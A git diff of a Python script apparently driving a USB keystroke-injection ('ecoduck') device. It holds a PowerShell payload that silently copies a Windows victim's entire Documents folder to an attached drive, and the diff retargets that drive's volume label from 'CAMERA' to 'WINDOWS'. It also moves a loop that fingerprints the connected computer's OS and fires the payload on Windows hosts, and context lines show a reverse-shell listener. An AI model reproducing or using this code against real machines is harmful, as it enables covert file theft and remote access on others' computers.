@@ -7,46 +7,12 @@ from subprocess import Popen, PIPE, check_output
 from multiprocessing import Process
 
 shellcode="""$foldername = $env:computername
-$mydrive=(GWmi Win32_LogicalDisk | ?{$_.VolumeName -eq 'CAMERA'} | %{$_.DeviceID})
+$mydrive=(GWmi Win32_LogicalDisk | ?{$_.VolumeName -eq 'WINDOWS'} | %{$_.DeviceID})
 $destinationFolder = "$mydrive\\$foldername"
 if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
 $target = [Environment]::GetFolderPath("MyDocuments")
 Get-ChildItem -Path $target -Recurse -Include *  | Copy-Item -Destination $destinationFolder -verbose
 Write-Host "The file sync is complete." """
-
-# Ensures simple gadget is selected
-__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
-os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC 2>/dev/null")
-os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/null")
-os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
-os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
-print("Waiting for connection...")
-while(1):
-	if(eco.test_connection("/dev/hidg0", 1)):
-		print("Device connected to target")
-		# OS Fingerprinting
-		detectedos = eco.get_target_os()
-		if "Windows" == detectedos:
-			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
-		else:
-			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
-		path=check_output("/bin/ls /dev/hidg*",shell=True).decode()[:-1]
-		print("HID Path is: " + path)
-		print("Target OS is: " + detectedos)
-		sleep(2)
-		if "Windows" == detectedos:
-			payload()
-		print("Payload completed")
-		# Switch back to simple gadget
-		if "Windows" == detectedos:
-			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
-		else:
-			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
-		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-		sleep(2)
-		eco.wait_till_disconnect()
 
 def reverse_shell_listener():
 	s = socket.socket(AF_INET, SOCK_STREAM) # Create our socket handler.
@@ -86,3 +52,38 @@ def payload():
 	listener.join()
 	# Copy Documents Directory to Flash Drive
 	httpd.shutdown()
+
+# Ensures simple gadget is selected
+__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
+os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC 2>/dev/null")
+os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/null")
+os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
+os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
+print("Waiting for connection...")
+while(1):
+	if(eco.test_connection("/dev/hidg0", 1)):
+		print("Device connected to target")
+		# OS Fingerprinting
+		detectedos = eco.get_target_os()
+		if "Windows" == detectedos:
+			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
+			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
+		else:
+			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
+			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
+		path=check_output("/bin/ls /dev/hidg*",shell=True).decode()[:-1]
+		print("HID Path is: " + path)
+		print("Target OS is: " + detectedos)
+		sleep(2)
+		if "Windows" == detectedos:
+			payload()
+		print("Payload completed")
+		# Switch back to simple gadget
+		if "Windows" == detectedos:
+			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
+		else:
+			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
+		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
+		sleep(2)
+		eco.wait_till_disconnect()
+
